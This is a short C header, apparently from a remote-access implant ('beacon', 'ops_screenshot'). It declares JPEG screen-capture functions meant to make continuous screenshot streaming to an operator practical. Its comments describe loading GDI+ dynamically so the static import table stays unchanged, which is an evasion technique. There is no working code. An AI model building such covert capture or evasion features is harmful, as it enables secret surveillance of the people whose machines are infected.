/*
 * csdev :: jpeg.h  --  截屏 JPEG 编码 (截图流的使能技术)
 * ==========================================================================
 * 为什么要 JPEG:
 *   原来 ops_screenshot 输出 24 位 BMP —— 1536x960 就是 4.4 MB, 分块回传要
 *   9 轮 beacon, "连续截图"根本不可行。GDI+ 的 JPEG 编码器能把同样一张图压到
 *   约 1/20, 才谈得上截图流。
 *
 * 依赖: gdiplus.dll + ole32.dll, 全部 LoadLibraryA 动态解析,
 *       静态导入表保持不变。
 * ==========================================================================
 */
#ifndef CSDEV_JPEG_H
#define CSDEV_JPEG_H

/* 抓全屏并编码为 JPEG, 写入 out。返回字节数; 0 = 失败。
 * 失败时可用 shot_last_error() 取原因 (静态字符串, 无需释放)。 */
unsigned int shot_jpeg(unsigned char *out, unsigned int cap);

/* 上次失败的阶段名 (供诊断) */
const char *shot_last_error(void);

/* 按比例缩放抓屏 (100 = 原尺寸)。用于进一步压小体积。 */
void shot_set_scale(unsigned int percent);

#endif /* CSDEV_JPEG_H */
